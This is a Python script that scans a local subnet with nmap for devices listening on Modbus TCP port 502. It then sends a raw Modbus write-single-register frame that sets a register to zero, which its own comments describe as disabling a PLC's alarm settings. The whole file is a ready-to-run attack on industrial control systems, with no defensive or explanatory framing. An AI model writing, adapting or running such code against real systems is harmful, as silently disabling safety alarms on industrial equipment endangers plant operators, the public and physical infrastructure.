import socket
import struct
import nmap  # Requires python-nmap library

# Constants
PLC_PORT = 502  # Modbus TCP port
MODBUS_FUNCTION_CODE = 6  # Write Single Register
ALARM_SETTING_REGISTER = 100  # Example register address for alarm settings
NEW_ALARM_VALUE = 0  # Value to disable alarms

def discover_plc_ip():
    """Scan the network to discover the PLC's IP address."""
    nm = nmap.PortScanner()
    nm.scan(hosts='192.168.1.0/24', arguments=f'-p {PLC_PORT} --open')  # Adjust the subnet as needed
    for host in nm.all_hosts():
        if nm[host].has_tcp(PLC_PORT) and nm[host]['tcp'][PLC_PORT]['state'] == 'open':
            print(f"Discovered PLC at IP: {host}")
            return host
    print("PLC not found on the network.")
    return None

def modify_alarm_settings(plc_ip):
    """Modify the alarm settings on the PLC."""
    try:
        # Create a socket connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((plc_ip, PLC_PORT))

        # Modbus TCP/IP frame to write to a single register
        transaction_id = 1  # Arbitrary transaction ID
        protocol_id = 0  # Modbus protocol ID
        unit_id = 1  # Modbus unit ID (slave ID)
        length = 6  # Length of the remaining bytes

        # Modbus PDU (Protocol Data Unit)
        function_code = MODBUS_FUNCTION_CODE
        register_address = ALARM_SETTING_REGISTER
        value = NEW_ALARM_VALUE

        # Pack the Modbus TCP/IP frame
        frame = struct.pack(
            '>HHHBBHH',
            transaction_id,
            protocol_id,
            length,
            unit_id,
            function_code,
            register_address,
            value
        )

        # Send the frame
        sock.send(frame)

        # Receive the response (optional, for verification)
        response = sock.recv(1024)
        if response:
            print(f"Response from PLC: {response.hex()}")

        print(f"Alarm settings modified successfully on PLC at {plc_ip}")
    except Exception as e:
        print(f"Error modifying alarm settings: {e}")
    finally:
        sock.close()

def main():
    # Step 1: Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if not plc_ip:
        return

    # Step 2: Modify the alarm settings
    modify_alarm_settings(plc_ip)

if __name__ == "__main__":
    main()